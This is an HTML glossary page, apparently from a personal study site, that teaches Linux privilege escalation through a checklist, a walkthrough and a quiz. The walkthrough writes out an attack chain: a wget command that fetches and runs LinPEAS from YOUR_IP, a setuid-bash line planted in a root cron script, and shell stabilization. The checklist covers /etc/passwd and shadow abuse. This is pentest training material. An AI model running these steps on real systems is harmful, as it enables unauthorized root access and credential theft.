@@ -1,0 +1,182 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>Privilege Escalation — From User to Root ☕</title>
+<link rel="stylesheet" href="../assets/styles.css" />
+</head>
+<body data-page-slug="privilege-escalation">
+
+<div class="progress-wrap"><div class="progress-bar" id="progressBar"></div></div>
+
+<div class="topbar">
+  <a class="logo" href="../index.html">☕ CYBERSEC.VAULT</a>
+  <nav>
+    <a href="../index.html">Home</a>
+    <a href="../index.html#topics-web">Topics</a>
+    <a href="index.html" class="active">Glossary</a>
+    <a href="../tryhackme/index.html">THM</a>
+  </nav>
+  <div class="search-wrap">
+    <input type="text" class="search" placeholder="Search (press /)..." />
+    <div class="search-results"></div>
+  </div>
+</div>
+
+<div class="breadcrumb">
+  <a href="../index.html">Home</a>
+  <span class="sep">›</span>
+  <a href="index.html">Glossary</a>
+  <span class="sep">›</span>
+  <span>Privilege Escalation</span>
+</div>
+
+<section class="hero" style="min-height: 45vh;">
+  <div class="hero-content">
+    <span class="coffee-badge">📖 glossary · post-exploit · the elevator</span>
+    <h1>Privilege Escalation <span style="color: var(--accent-2);">⬆️</span></h1>
+    <p class="subtitle">The art of going from low-priv user to root.<br>The second half of every pentest — and usually where the real fun begins.</p>
+    <div class="tagline">"Landed as www-data. Leaving as root." 👑</div>
+  </div>
+</section>
+
+<section class="chapter">
+  <div class="chapter-num">Chapter 01 // Definition</div>
+  <h2><span class="emoji">📖</span> What is privilege escalation?</h2>
+  <p class="lead">The process of abusing misconfigurations, weak permissions, or vulnerabilities to gain <em>higher</em> privileges than you were initially given on a system.</p>
+
+  <div class="paper">
+    <h4>📝 Think of it like sneaking into the VIP section</h4>
+    <p>You got into the club as a regular guest (initial access). The bartender pours you the house beer. But you spot a staff-only door someone forgot to lock (misconfig). Now you're backstage with the bands. You notice a manager left the keys to the safe on the counter (bad permissions). Now you're rich. <span class="highlight">Privesc is a series of small "oh, this shouldn't be accessible to me" moments that add up to total control.</span></p>
+  </div>
+
+  <h3>Two flavors</h3>
+  <div class="grid cols-2">
+    <div class="card">
+      <h4>⬆️ Vertical</h4>
+      <p>Low-priv user → root (or admin). You gain MORE rights than you had. The classic "privesc."</p>
+    </div>
+    <div class="card">
+      <h4>↔️ Horizontal</h4>
+      <p>User A → User B at the same privilege level. Different set of access (new files, new services), but not "higher." Useful for pivoting.</p>
+    </div>
+  </div>
+</section>
+
+<div class="divider">the methodology</div>
+
+<section class="chapter">
+  <div class="chapter-num">Chapter 02 // The Linux privesc checklist</div>
+  <h2><span class="emoji">🔍</span> What to check, in order</h2>
+
+  <div class="grid cols-2">
+    <div class="card">
+      <h4>1️⃣ Kernel version</h4>
+      <p><code class="inline">uname -a</code>. Old kernel? Check <a href="https://www.exploit-db.com/" target="_blank" rel="noopener">exploit-db</a> for a working local exploit. (DirtyCow, DirtyPipe, OverlayFS, etc.)</p>
+    </div>
+    <div class="card">
+      <h4>2️⃣ sudo rights</h4>
+      <p><code class="inline">sudo -l</code> — what can you run as root without a password? Any binary here that can spawn a shell (vi, less, awk, nmap) → game over. Check <a href="https://gtfobins.github.io/" target="_blank" rel="noopener">GTFOBins</a>.</p>
+    </div>
+    <div class="card">
+      <h4>3️⃣ SUID binaries</h4>
+      <p><code class="inline">find / -perm -4000 -type f 2&gt;/dev/null</code>. Any non-standard binaries? Check each one against GTFOBins.</p>
+    </div>
+    <div class="card">
+      <h4>4️⃣ Cron jobs</h4>
+      <p><span class="term" data-term="cron">Cron</span> running scripts as root? Writable by you? Instant escalation. Check <code class="inline">/etc/crontab</code>, <code class="inline">/etc/cron.d/</code>, and run <code class="inline">pspy</code> to catch jobs in action.</p>
+    </div>
+    <div class="card">
+      <h4>5️⃣ Writable /etc/ files</h4>
+      <p><code class="inline">/etc/passwd</code> writable? Add a new root user. <code class="inline">/etc/shadow</code>? Crack hashes offline.</p>
+    </div>
+    <div class="card">
+      <h4>6️⃣ Service/config files</h4>
+      <p><span class="term" data-term="systemd">systemd</span> unit files with weak perms, Docker socket exposed (<code class="inline">/var/run/docker.sock</code>), LD_PRELOAD abuse, Capabilities (<code class="inline">getcap</code>).</p>
+    </div>
+    <div class="card">
+      <h4>7️⃣ Interesting files in /home</h4>
+      <p>SSH keys, <code class="inline">.bash_history</code>, config files with creds, backup scripts. Low-effort, high-reward.</p>
+    </div>
+    <div class="card">
+      <h4>8️⃣ Running processes</h4>
+      <p><code class="inline">ps aux</code> — services running as root? Custom binaries? Commands with creds visible in args?</p>
+    </div>
+  </div>
+
+  <div class="callout success">
+    <strong>🧰 Auto-enumeration:</strong> Don't do this by hand every time. Use <strong>LinPEAS</strong>, <strong>linux-smart-enumeration</strong>, or <strong>LinEnum</strong>. Drop on target, run, read the colored output — they flag the juicy stuff in red/yellow.
+  </div>
+</section>
+
+<section class="chapter">
+  <div class="chapter-num">Chapter 03 // Full example chain</h2>
+  <h2><span class="emoji">🎯</span> A realistic privesc walkthrough</h2>
+
+  <p>You popped a web shell via an SQL injection → dropped to <code class="inline">www-data</code> via <span class="term" data-term="reverse-shell">reverse shell</span>. Now what?</p>
+
+  <ol>
+    <li><strong>Stabilize the shell.</strong> <code class="inline">python3 -c 'import pty; pty.spawn("/bin/bash")'</code> + <code class="inline">stty raw -echo; fg</code> for a real TTY.</li>
+    <li><strong>Drop LinPEAS.</strong> On your box: <code class="inline">python3 -m http.server 8000</code>. On target: <code class="inline">wget http://YOUR_IP:8000/linpeas.sh -O /tmp/lp.sh &amp;&amp; chmod +x /tmp/lp.sh &amp;&amp; /tmp/lp.sh</code>.</li>
+    <li><strong>Read the red output.</strong> LinPEAS highlights: SUID on <code class="inline">/usr/bin/find</code>, world-writable cron script at <code class="inline">/opt/backup.sh</code>.</li>
+    <li><strong>Pick the easiest.</strong> Cron runs as root. Script is writable. Append <code class="inline">chmod +s /bin/bash</code> to the script.</li>
+    <li><strong>Wait for the cron interval</strong> (say 5 minutes).</li>
+    <li><strong>Bash is now SUID root.</strong> Run <code class="inline">/bin/bash -p</code> → root shell. 👑</li>
+  </ol>
+
+  <div class="callout danger">
+    <strong>🚨 Lab it, don't read it.</strong> This only sinks in when you do it live. TryHackMe has excellent privesc rooms: <em>Linux PrivEsc</em>, <em>Linux PrivEsc Arena</em>, <em>Common Linux Privesc</em>. Run them in this exact order and you'll build the muscle memory.
+  </div>
+</section>
+
+<section class="chapter">
+  <div class="chapter-num">Chapter 04 // Windows side</h2>
+  <h2><span class="emoji">🪟</span> Windows privesc (quick note)</h2>
+
+  <p>This page focuses on Linux — which is where most bug-bounty and CTF privesc lives. But Windows has its own universe:</p>
+  <ul>
+    <li><strong>AlwaysInstallElevated</strong> registry setting</li>
+    <li><strong>Unquoted service paths</strong></li>
+    <li><strong>Token impersonation</strong> (JuicyPotato, PrintSpoofer, GodPotato)</li>
+    <li><strong>DLL hijacking</strong></li>
+    <li><strong>Stored creds in registry / SAM</strong></li>
+  </ul>
+  <p>Run <code class="inline">winPEAS</code> (the Windows cousin of linPEAS) to enumerate. Reference: <a href="https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation" target="_blank" rel="noopener">HackTricks Windows Privesc</a>.</p>
+
+  <div class="quiz">
+    <h4>🎯 Quick Check</h4>
+    <div class="q">You run <code class="inline">sudo -l</code> and see you can run <code class="inline">/usr/bin/vim</code> as root. What's the fastest path to a root shell?</div>
+    <div class="options">
+      <div class="opt" onclick="quizAnswer(this, false)">sudo vim /etc/passwd and add a new root user</div>
+      <div class="opt" onclick="quizAnswer(this, true)">sudo vim, then <code class="inline">:!bash</code> inside vim to spawn a root shell</div>
+      <div class="opt" onclick="quizAnswer(this, false)">chmod 4755 /bin/bash as your user</div>
+      <div class="opt" onclick="quizAnswer(this, false)">There's no way — vim can't help</div>
+    </div>
+    <div class="feedback"></div>
+  </div>
+</section>
+
+<section class="chapter">
+  <div class="related-terms">
+    <h4>🔗 Related in the vault</h4>
+    <div class="tags">
+      <a href="chmod.html">🔧 chmod</a>
+      <a href="cron.html">⏰ cron</a>
+      <a href="linux-permissions.html">🛡️ Linux Permissions</a>
+      <a href="reverse-shell.html">🐚 Reverse Shell</a>
+      <a href="su.html">👤 su</a>
+      <a href="systemd.html">⚙️ systemd</a>
+      <a href="../tryhackme/cybersec-101/linux-fundamentals-part-3.html">🐧 THM: Linux Fundamentals Pt. 3</a>
+    </div>
+  </div>
+</section>
+
+<footer class="site-foot">
+  <p class="coffee-line">Enumeration > exploitation. Every. Single. Time. ☕</p>
+</footer>
+
+<script src="../assets/glossary.js"></script>
+<script src="../assets/app.js"></script>
+</body>
+</html>
